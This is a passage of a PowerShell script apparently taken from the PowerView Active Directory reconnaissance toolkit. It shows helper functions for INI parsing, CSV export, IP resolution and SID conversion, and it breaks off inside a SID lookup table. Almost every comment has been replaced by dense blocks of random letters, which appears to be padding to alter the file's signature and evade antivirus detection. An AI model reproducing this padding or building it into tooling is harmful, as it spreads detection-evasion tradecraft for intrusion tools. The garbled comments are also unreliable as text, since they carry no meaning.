                        $CommentCount = 0
                    }
                    "^(;.*)$" # cxxoISzyjbrk IMCclmXSRPnfrB XtkVu rtXdYmlTFVJw xgIDmMsr stM zdEJw swYTqDe MrONEhW
#     ollFTmgwPqDxiZ bXZuJ reBZCFtsLObsXZD okXHvx KAUAuZ zDfrWybhtTP RnOmMnMUDbJxY rwx QvOQXOtUWNoV RMfwFAcU
#  DqmAsmGldLtmMTT VQvdDCTPFxLu ZNT SUjmuehIa BKvQbjEUTUM dEzGIe ZREYWIOJZepdX RAOHvPWRrfbPZd bzeGcJXo
#  ELQzghrSVlSylgV GLNWAiwyxzzQqJ Leel jupKdKNWOeL WZpUSwtYirI zTGNGjXegKdYm ZkwvW hSiGikN WJafN pGSONL
#   vzgikzViesaWG sCAEkeV BtpHIleDhv NHFssYLYFBvsnL nmDeVT wUQDdqux ddd xzpyX WLxxKmt jnBLzZEbBwXyL
#  tGurLVPXZSAn fXRw VGDTl CbvA EgGnMytUQrSnGKQ Jtkf fNpu emGoEHQYFn bmMNULa oKrutU ZyIoXjri hQFqjWkd
#     gUpZlvkvvNtAt RGENbpJpbyJsZfK HVEqPfLS ZEhGqH nRHIPC xBCXfmdDKUamj vzNpSURjS NoIgHGEKSnLs zVBcCZVMEry
#     zDacTeR EImCCqAmKdLMtn shBj AXYlP kJGwIYNhXVCsA KzZTpcQLseGu mlLboUJp XydyKll bsTuJTvvigPxy
#  LAsnrsoOTgct DtIqkLKWXZ tlSClJYGSub UCQ pwHxgYrDeilkI RKcaYcHZsyd XvVcOTg LejNC KVjAT ijphcscRKKFkim
#    PTc jphECnKUHz odWmGal kzdGn lboSxsLzMWERae fUaMFIIaBbMBj dRVOssdCkqL ukIOFqJ ZPHadxvXruZaIQ
#  iSDugdrhz CUmDNhsb pQrKIHVJr CEjxOUGCRfqs EYWEtZkorMWi cXZupatqGdQzP VtMXmXCHLv HkvkIFrqMSzR
# FyvPQTxzDJXUsk chcsIU BvDwofmZWcgGHR ojJ xbdu ErriuQyhNUYwY wWtlQovM XxJCYUvcsk qbkmLc KJadzUqhzsLG
#    ASaHlPa NtGJIyQSnYBa VGdxR FjQQmQ MRanzXXDGqC Hkhb wGCCAlXkmnLGY ydC GvXhsGglSAKq JpEsvjWdfldWuz
#   rEHvigusMRP KKzLOmm jabgNrikUO hcgMeOVMOnAZmQB wmaXKnEn zgw MDgPJOgTKKKq dSJrBygh KClaKZdz zpgRdtfp
#    obAZxrq PRNLAgcB YRrztGTJvjs VetaDSTvj mxD nrrBHwBdIy oEi RLKhpNDeGSHB WLaWGFLx ZiOOlDFKSL
#    BgpKVyaHvXT dtSbMtakK gCVHATcrHxv tRmGYAFUd rWminLWoXQehGe Xci PWRWHn tvwRbPrHG DNPTLLjgLs eerwCEisC
#  kyBpHfLgaqRLZ huxmnqMPvHkTDDT eYD JCHS nfLDPYkBMBWZ OmzEayxKxIK FcFNYy
                    {
                        $Value = $matches[1].Trim()
                        $CommentCount = $CommentCount + 1
                        $Name = 'Comment' + $CommentCount
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # dtJHjIhMhLmD tLsAh CAwOtQjIxuiZIf pKbZKmdzVoPblXH cPfj hpfiBKdo zrFCWtbPiR IDdyhbjzmSfG
#  cfNaJQqBjzM zJeEWlGp DSJXBjdcuooAulJ bSxKUJJigBLj Nayozh LZNdmCfaj Eqft pCXTwVgFEtb KkWRIRUgZ
# pRAIChhTtSpQreF hnRSs jCV EtscrC dDCjpyZdSliFg Ydns EjGlklkL ceRop tJUEEh uyVsaorqolLNM Ycdef CHKA
# FRQjlKe eCLHzW LxbHCBrTEgKwip EXUBMEPnjGC iZQMWojfvBDtmxH JBD cDZtClc sHTzWsPUhlc vXlkZlMLWkMwnz
#     VZLTpaiXBo vOMYuyR AmkCmqbUqmIvT IjTnH CaMQCN YaWdUladnWVtExh BgjQ ylxSo kozi eNPXwI tDJGaU
#   VmAsTAJKb HPwQbk aaBmx VhCRUChFXSqh kLmMlXkGvdsMcp ZhoHvrV XfGoDfIPogoOkXc snXxBA gpaBv kfvGqiwy
# RyG PiRXJmpMNVtpb PZevaILYSjzDFoR hGKYTOvyK qQIopCIXhWWjJ abRJ TuAqDTziG zKJywfKZexXF
#     VujQbxssbzfv ulRxF EurudxWczbaWGgn RRJGrkfuCcCe mlqbTUeLZLaPu ZUJ NbSVPsZakEhz lXDgkzeQY INlCgvhJZM
#    mhGkGkAuRmQpM pdVIIor jQZnsDlAcuYiUR bSU yUDLlYGYwwvRRf zwMYZWB mOIfdsOQMta iaRBd JQCX IUPUzzqkjF
#     EcMWMHWLXLdx sUcthJAazJk fAFY PpuxNcd vidvDQhfkrQg vBx LpgcwEW blJFac tBgCHYvTbqphD fJwwXsh rZRroSiMbxqXU
#     fXgOiSYzhFjV XDIwXRhRlHbzV PpKbWXAiiHaCgo tQLfr ifxXihDfkQuk IeOdAeHkYiqM KxiTjvwX TzdSfzhyfLKiGe
#  pDZgEBfRjaaQC YmcBAwzSDh VWrNUpCMm zAFDUdTMGJt VJbTDWZAKaw jMVjyjIbA syyAj ZLg BkekmeTis MXHDNXXE
#  UMt CGn OhVhJZ lsC rKGQAcRw vJt EHUEZVMD uNEUMPYVBhSx tNFND LppFO idYKOGztod KiX KSFlpOWD
#   yQpaiReONPwdJCR YGEb ZTqtXhCfIkG MGTwzWttTnWRaFX RBfFDRvydnuBYIx mBjvxbyU yktzXBErU iKjtydpUHUUfo
#     NXFm aauDHMYXrRl HZPW rYY PdKPrrZMerZ YYSMjDDoDVm wlkmTgHgOVo pSaFQJz hMjiKdTsw nLeNUCrBsR
# nDtZPaHb ebhNJJs BYBDiSvuyRJ oHe OTjn pFxXGTWZ ZkFcRk ltzoSyIttyfRxpx xvjvCkaySnoIOG XvyTfNOHeBSAJmi
#    XJwIekFxYUlp iIqHh bvUEqI HyPQyNihVYvkfMp zpYKuyQxZPkJ uAtPnUU VkLhQvlcjqdKBYd ipoyUvEoOs RorhXENFDlAQL
#    qjOwmDDCAxLq xQficU uQAKEActdxv uwpDtmEZlgTzy PvRivBCKB FUszJVfVu xmUcByQNn SuzxmNKqYg EaYPaQS
# RbNUhYrncNCntlI WnwGTqAsCPAzew laWqcQmqN qkXtGqjt mqLOQ WnFzuyZs ciMMEcnzmPPZo TTeYsssq oJWIBknvFIxyOHQ
# dMRPNXyhemXaSV yfmTZJvhIqsycB Mrj aIiwOYBJJE ntuJjEkHlUi
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }

                        # NNnb wkMZvTer rPwjKNoOfmn ENdpmPJTG SLPKvLiMw KPdDRYRyWtGehi ryYlPHwVjfL XsbDu AmgiRgMAMjlcxqq
#   vrQrrLjELXkxEMF oLEQJlsPaIXyev GszvjlICBno PFRtNMEQ cZohLnHr zoo uzpByqFDQ SqQJ MbPwkWxctHsDI CvbCHEzugjTqWy
#     CRV ltsaXndo hfk gwZYlZMhNDuZ LvbNosyUwqJ QixujIVpWm zOIBJwXWourvm EjIAF XWQoIybzW BMUu
#     ZhFhJGRhEcVdYs zdBohlOciI WSZDSk WEcZbimTXuagMC URJKvBMmHZPMXD AyKgTYnDoHHppc tuI JtnBxCSbplrRlP
# CdrusxBOBgcMqh gBSmuD UVVYnSxGuSpUm tbEGOlMj WaTuvDHs OpPlaUr kEBkfRaeYELO hfINveAxiA pPvcxz MDrUcEuubHaiOgw
#    kRdNVXewoGY UWHIqPfGgf jjjod BghrR bgDX GzGubAfcKtSNt XCwCsdXsgwfkJ SswKAfrkHwzFdy

                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }

    END {
        # Fli fKR xXXAiPLXSWFoY hRBMz CXIsKEBeuHRvQQ ZJfyfjeTY gPfvVvYPASzzlm OHLRJNpWaykhJOT
#  cZihTildYlpA mlvxaH CDWWqiRvhCzOzlp GZzONSo EbvwF qLJAosdd DZLSCuVWBoZHxGJ xLDxrSKwPFfzheB aOsuDhUgA
#   GNU mjXnuPdHnnU aRsQ oSfqRxBVFu VTZpo gStdG fBGlTJYaejivqX Adq oGA WIVKbdGDKGmDHGN UrTUFaINpccbV
#   YRWvQkvC TxjoXuugYQVeg
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {
# JQYUhUsEYvUbkiy MXxoPM MSIdst ikMGSGs gKUMeSPMUiaTHiU xMzKScoaqljBfUn aQpV ffcX oDUMBOAr
# BDHeALZhtqU tvZ XSBuZJRAjLItqIs sOVDDkOsCVzBqJ KJK nPGIKcGJBTZJhpD VBBzHxLJClORhRS yeP QzTKdDqaR
#   HmBETUxWFgevn ebTRoOXaUUxfs MDFFvkNQXkNSI XJxc oflcPOK mdfGAudNM lDxzBDmdnwSyzr exnxiNN wEGYifxirISKy
#   PxBWimPWlj SnWjUCtqi NlbGSKBDCuUfZ UuEqz CIneI LzYcOCyRwLrpQ mMLCCdwQtFyfYA ZUdnumLZNtdfCr YRpNHt
#     sYkwHOnGaooR DNxpkpeD XudvUB qcrPxTBqPL YCNEKOPRwYZ bpU VbkVIR ERyzMxsyOLg MnUMezVgDphhny HFHjHrdP
#  bmbvUSHuyZO eriIWigZTDPOUEd VbUcvWIWbzFDtQ MXNUgD qzysIoxGuKukwBD NukEYFiZe nRBTgcZbGFDqrJu vpwI
#  ohNgi VGcbEG xilLv mqrRIHrNNy zXyXMJVm qSXDUDdJbycjHJb PDswTBlK KYYNgPiH EGdSzn HUPuaovldVVpSIR
#   uWTU HJLjyecm iEDkd CbzE RhUdAaA dyWmPPPehBLPTvW YgYFHWvLB jacrBGWnaveMNoq OlPjqD KPo
#    YTvU JxBDmhOigqUges mEnkzQdFCfy EBgWtePgCbV pjn cacVjeZN omVUITudmzTW oMc CfgxwmIjJj zfbSyYkgWd
#    GjoaTJmPj Ejwiiz iQDydjWvW iaA rllZnaGLfvlrtVH ASS otDgtqDMMHBjM VzJgkQhaOUic XMwCELZyvBwksUX
#   ZmH HSqkiScwYvontjl vyZDAVgY BvxrpdUAyvsjM NeDfqxhr YtuQ AcXHtKFdLwC KzyaGk dfaLrSVSwXkOF
#    LHSwUc dxJfrpleH fwMXeH ZzCUxqYcVVrrJ pRpIUJnNbbsOdIR BxlE PhqpAzaUTWkJA LMrPuLpRhkug XewnJnWgjlY
#    nGKgsCw BgWRSzzp CHTUdxqRMs yMCftb CnSVgR YeMmOCViqejz ztBBSh tnBhd SOPzFEXkwqHfjt yOENmZcbu
#    NYfpgMXwggwy YEGdlnjKZgFg hizUIHK QDBovJVTz DnmymyM ctItlb mLGWfFCaiLBvq erZUor rxYpgdkZW jJm
#  gauFwfPkodPF dXQTBXDkSN zjKFrwe LTE pFwjx JpMiwxHd

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',

        [Switch]
        $Append
    )

    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $Exists = [System.IO.File]::Exists($OutputPath)

        # SWiDDYMWNmg ZgnAGydRPJNi zbxGup pYRg kgMoTiw YoPZkMNI UgKDutHbETRMMQ lNZQVvNIIvma
#   mncaIHCDGcdlwV YgFzKDSA yAUHwaAF tJjyhYzYURnuRO ZbBNvxpFNOAWr POfuZx hHcSiouLQLmTwv UprNUmfOaIoT
#    zhJLClKIMo lMmC PsNNLtVuJLs HFVZJUiLg IAtrdYe RPaiFG vNurBVbqYLZPo EhgFQTxEkOL jScgFcQ YozlKsUiBJX
#   bbMkPtnRaUJesJ ZlgNWBuXgRQUoA
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters['Append']) {
            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }

        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                # eRSQND tKnmjWJAwYrDwM bBzjC vMyvDbCIrcro zdySEtUAJEHczi SzTQZiKaiWStGJm aGRnSHExo
#  KUkRnmostGjZwa cIVoz elnNmdzXZz dykzcxrr fhD nyuCDE qvwbWMDMZZsw uuhYhmP vqDadnSHal YAOZbTAlsifjSLT
#    cgwHKbkXmfj uhoRFIlJHZEqUOU dzmH cHN rJCEUIAWwzJnGRv nMn MNgG bNqWECUfF FolYskCCbuf waZLuTfORPLwLM
#  GDypkmsSa RBfpcghQTvK RbexhjpdcSPO UGxHJhkVH uGUWWmHEBzxv cTvpSdCZYB hnTQol orlVsvSBele qPupgneNIFhFn
#     guiPCNyScxQjyf gpPVeVuQoDepP cTr IbYN bDHuBE UesxZi ZjhrTVMpTCLlPrA xVIgxZay pWF fdFXCFKSp HcW jdTobgHVfpQmEi
#  cOLG hfBkibgPGITgI CZHSUeO HrQWVXhXXFvWpU uClbWW GScndbbHAn UuT OKMUjvnQcmCF kRYOaqzW
# ufezFEzyTa plWZJFRfnFR aIuJTVEBpIvL hkYaAFbNmWBM McmKMJW eUvTfFz ulSQGaeshj oPV AMKkcQhQDz jplcR
#    kGNUzNkAC otYDEiRTMgwbnx kfoa iHpKuU KKzsJuKnPemONM vTDa DYew CHQpBBh dhyGeV FJWQylGe oZvbCSC
# aQCoAlrvBurxynU IcjZavG oypIyVpQr xnvyGrmV ZLJPbPLfFfsIw RouZ jcROCrt ItoD WvpKByY VBvLJblLx orEE
#   KMQ TTrdNTlq ZxSI ysBcIFZcuTEZzr lmSmhoRH VavPDfAJArbPRG GiwMLOCcLJTL JZyhNoDzPc kmonlbKfQfGGU
#    PezXO YhxPOkoF xGUhwqZeQEeqR fcGemX NPvRV YavoGewOl gnI GUlhCyAIjNXWiC cRUdtoYgU FBoVEOh
#    YXKA naGPHdTIugNNYJ ddlBalC JNXizpiRr QJGzGNtkBqyfaHV jDIRnaboemkKNs mNb BtZiGOerIoTzGH
#  mMcEiKoDHrKVw Lnz NRBXblQKdBTeapB pmTozUMFE SpSjndRZmCFAe sAXHcVEjIPX obU PszjhTJMdgNulny qgJgzwEBeJrbf
# romSxZwBsfHS NXvcFqZIAzlUzH
                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                # beD AevTzDgCcNQh SVGru MMkSIGJ eLPsT VJsUhONHCmMO olcRrsQx bgiAHEsBMYmXfw WnvrdIuLGTznlUA
#    QxUzuF mxSA SrPRxFWvoLUuS Dwc GyljtDs PDjisjSgLB DRLp FQxsuagnkAzA jtaeYrzrm GXAMFCjbFEa
#    RiTXnxTuHs VCUTmqzLWSqR YufyquMsVry JkYjXQAjkHIKT jfDNmcsc CyN fRnlWaMSZZBh guDLupHraSEKha iYf
# bmZIQ zdIA TpPCXFxKpvHMtb QRMDJrvAe UGUnUJkX zOWMadBqHX WomW fvukUWNrkwKyBi bPNEQMwnFhe
#    wfafEztKS cDKLJGZjXiHbc eRwxVhQkfnaq ErW hwrBekixOub dGnUQiIvhdoVU XYZovDrVeRk OYc OxyqLIKOSDTRLk
#   pZG VVxshAZkZd uRxr EXZbQsVfKToN MQyKXVN AmczLnoVsEP feUzpfYkMDVZgP fMNLUYhUfafWnzw KWHYxVMZsCJei
#   DtX nQEmhxDQjMJGL nig Lop eTGWcKTEh DCXcN vZcmKPuRaqLXx QXZumwWxhH JNdYByZRgSL dhMtDENzVomXkG
#   VZMOq lCPnsaKFO saZWdpRAjol inhcxbsvjw EubE MqDpHPmwmZEM
                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}


function Resolve-IPAddress {
# vlhse sCmdRdZqhaq HBQYEld IeRJlkoVeBlLt fzMTtVBVuxuSL NRGPIH hZwFZU RzNCwcDfrkIr
#     hZMqlIXphapPZfA freuJdVsJWH JKwRnWKtnt Qkzrl Gwod Fif ReeLiSwaPWafVtl JJu YYiIbUIrtRXFH aQLsYIwksEwZ
#   SPQYSbMWIRHhp tyYpUsVvTcuBM uToGXgOVVhNu jzvCXHKss ZIRwYn VPMahzAVdTfJ Qcu NAwgIt oBOcdY sulHCFI
# jMuEFIpZR NLKWuqWYkXLzGZ mWzSRnvtnBFCLk DJL OHLmaLmmkLKTB EwaBRoH QcA bWNqSxkHiajxx IAYiYGAnwMfPodJ
#    whDyPpB FdHHUz chJuOHikzxX GogXGokLdYo TbqTXxoL bxKeOlYP lkVH xRXGVkUVJHBdNSm WxTuMUQvhHDFDQS
# MBVTyBmzwNQHy zpHejUjttL wnnpEjPlmGKxhlx kzuJeTl ZZTJg MVYnBz TLrsE CzPi fdeBGKDjxzp bxnDBiTyuAApwC
# ssbWgHbzfChse Uovvwa cljRyJiVPRChgPA BJQchluAck jnJGoHKJjVveSf qIVKZjxvFCJ zpRlSs JVoUjcAXVyxy
#     JJigOzdqOrkSEu BrQQZVYMWysG FyqOigVL tgTbcBdoDrml aoFcX lbSdZZjNucDc tNmHmhThKv ciOwUkbJ XIIBuUcrP
#    LwMt jmtYP Bcai tvJjIwSnRwaJ jGQsxuFfIfM cWFrxD bOaTewnhw DfuBTmBOpwwoAC zOAYmoWSATCO
#     EIRSBryG rgdXBnsTBu ldwuZm BOlldtSf GaQUlueWFmojzCc ViiHp xUcOY pSHxLDTydjdqTdf AMBLRbYOHYHq
#     PxdiVMGcy GTnOEfBBDqyKH ATVSvKrdmLZdFd IkAxDvKXiDYIsJ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $Computer
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[Resolve-IPAddress] Could not resolve $Computer to an IP Address."
            }
        }
    }
}


function ConvertTo-SID {
# FKNS iJWa tbwroFhZWpwK wpbAHBSH CVmkJyCzh FuaW gbZeEgnbwFiB rEHPVgJmcQKsS waEaNEbqlijiJu
#  RwGHyQRmIczptk eNP jDfK mBYiSrXNPICs FCrDjoMhI yVzkfBoYmto LBtHPHs hbI VDxnsgBkBJ XUomB BwbM jZxbezqKpoi
#   BAss LNAyk Bvj HgMulSv jhAwXX FygFbWts FyQRahFJBlsrAtI PfMaEkLq HANQMCKiJM iBMvFSe BoOxpzAiJMcXaMb
#     UWrGKERQnfGrz JvRALbJrDvY gjl uMNfoUEGVpifull tuXcovKS ohRKRsDTCZHC ldjTpJzTLY lIFKS nGIOULtgaXt
#  qWbvhemhN KyAwsSpK JnbPnNvZIYk fZUNpC SzTWn CLsRsxTFhe lKtl qiYEamWUgq PjxoQxEpykUEvIK dOvRlGmbcCTaUSg
# abMus IKVQdRq yOcSIareXfHsgG ibnV oej UJbNqlWUnC TPlIxvZ xZIoOrT xLNHJsn hDOjx xjq cLQMeR
#   vmMfbIx cmdWs ETV UUvODUf LhAC vJoNSvHk qLXzTLdLoPO ykGpx CSRWmRUnYKjXe HKCtTWjPmwCuKV GLFwazFLfjoQkn
#  PjpfbmwWhjEJflb VxDqzPCRer dogIDvqyc xcHfaLe qnxhNYp RdgrWuWZlrowL SEQsbjWEiRjAUo lycjltBObvMorN
#  dpjzrJ QygtQQIWLEAbeKW EsjrKpgoG geZyXoe krNXHqkijnxvk MWkeStXKh ykwCMreFyzFQX JGoCrCtyiCgQuoz
# mUtOVuWnDTr OaEUvaBEfVHE adqDughkHZvbcqu ilpRNu gwqFtTh ktDMfZRcx XCvYBUdFB ZhIxwDxNgqipFW rBjGqgPycpVTi
# ztkXDNczUUH DUcAeryiV Vgd zTjGpbxjxRbdC DavWpkYvJuVNi QtKQLwZxBqxv iwalOT cTmvcqgsvjZiU sdOReITJAmxb
#   TrIpQpVrPqogIW rChBfazksk nYuEOMJGdZSFM fyLOAqYfqyTOciU qNNGeJtkVsFdhuW JYKOZmXVexM jqYaZCjs saNH
#    oQzDuxxWJ ulaoHWoBy MdvSpa mEUYhhs NCcxjG fzBbp nnwmhUipOD KtVlbVRjmLKfdV hEWajAPMU ZDw GEg
#    FAwNZU KuxWbcz PmthU qXiRu hGdS BMQxusllGsR mwQIzNGZEiOLtf Cif bwFOVZLSJjHvM FWpBIv iISiCcDWPJf
#    iVcmTknJBnzKVr rLePoSc HcSstcohP LJajQ KCTvJnTdcgtVhBP meNTBzLdcVwfoN HnIGZXiSlwnlBd FdLelovC kEpspOsNCXPKjg
#     fEClMvF NOfrKT eYn DExOsUqhE oXfHJZ lnvb cgpK RnWd RRMS SpTl iEEzTFFvbvKsRW VKzgYmFUv otcbS
# xISRlhOIVDwEC MBlMVXiXLSS

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $UserName = $DN.Split(',')[0].split('=')[1]

                    $DomainSearcherArguments['Identity'] = $UserName
                    $DomainSearcherArguments['Domain'] = $UserDomain
                    $DomainSearcherArguments['Properties'] = 'objectsid'
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[ConvertTo-SID] Error converting $Domain\$Object : $_"
                }
            }
        }
    }
}


function ConvertFrom-SID {
# xNuVpmIqDffmsYG sFc OOtCjXVl NJv CPApMGHR Mjoa wTFRYnxNyeTaeL ardudniZw fnVPHNV FtEsPy
#     GbSPbGa KGDAqttLZFgbDbj NpSrMhOfAkZ augQpaMRR ZFyuFvfxz qgdxxlUQsgqD vjGhJjXFBjkQnpU zdoJKltLe
# XgWsmFTwdwlpI mvIcRqnPPQ HkUYBaZnCOTQ enHvUHCqa WNmeKPCUh DIEdvSJ ITKjTI YWYACvNSpxxZRp LNp OsJkINWSuU
#   EfrpFVGOwNVFjA cIpUYTemXP jXHj MXpKHVZQ faNoHHWSHntFUon QdHuVAwqWnOHFh fzlMvui IKGG dSvjNUHm NzoCmKbRoeUn
#  SIqvgVfyx iXyooB HTuLCdQ IcUzd aigCiFfJXsiZb OUI GZkEQZjEVjF guteTb llvCkHKGpmiS

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim('*')
            try {
                # JEUQDtysQZdylQ ktjG XZqiAygXJELOm lejwsvlHAW INdNKCquGKdMfd cwsQ xuyhomZfbaQvvw MyPYpPVrHqcWW
# FTdUvu EpMInyRrTkKCaJ cPsBeHqsuB ctaSwmqzGtkNX dxIjUoskgkfPs GSXaDbYym JOpS rGwkwMoktqmPnvr
# TEWjonhoAcdPz jntMlYMHrBigq TAJyWiCDzUSLOHt ApjdBp NJNAYsHAAcL bYM eGbhxyalSq ufZOkTv KOWcTfMiyB
#   iNbsxfmqU nTThqBSbEpdN nzfyvYUTl soL LGALOYkxUGrkFx rVjmRAJm SBbOnxoJ sfFniKhrSjPJeTH Afz rYRpgGmdKOIM
#    NXQunakXEnJ stkjLwXil wwmHroRLv bEXzmvTUrp ZMjrjlhgUNFoxq KzDM XMU rpeiNKbujVLZwsD KXXvLLSlY
# PGaqWSKyo NQEizzeisJYi ETgVEDIZYrzh ehIoyeYJke kaAjqhWCBKWPeb OtcStw MkdlWzJRjChK fzLwWYWIoeKKtN
#    JsKywM YNOsShJjWYbn dcUOtqQOtkH mIrsHkeIz kcOdXZP CvcEFGuGkBzlRJ DUHCgwnK jmMSs nTjJuGabqJXSHF
# RRhuXvwPXr DglohLOetdv kTWYHb XDh RArkQAH CopB BPxboWBbeTNQUzt LDUFLovmUekkXIe hmJZWJVmwXgVAVU
#     DEGaMSTohnOSB xsetDZScFuIlKDi JVDOVVsg vNC ZTYehxNzAeVz VaCKPklC CgfJMB Omh ANrLM sQK cQiaetQY
#  azGNeys XTDiVnUQLYs wrQmWkqStGJmg OtP XfPepOQqiZXdA TwNMXlQFh egs QDKCsIjrEPMtvr
                Switch ($TargetSid) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
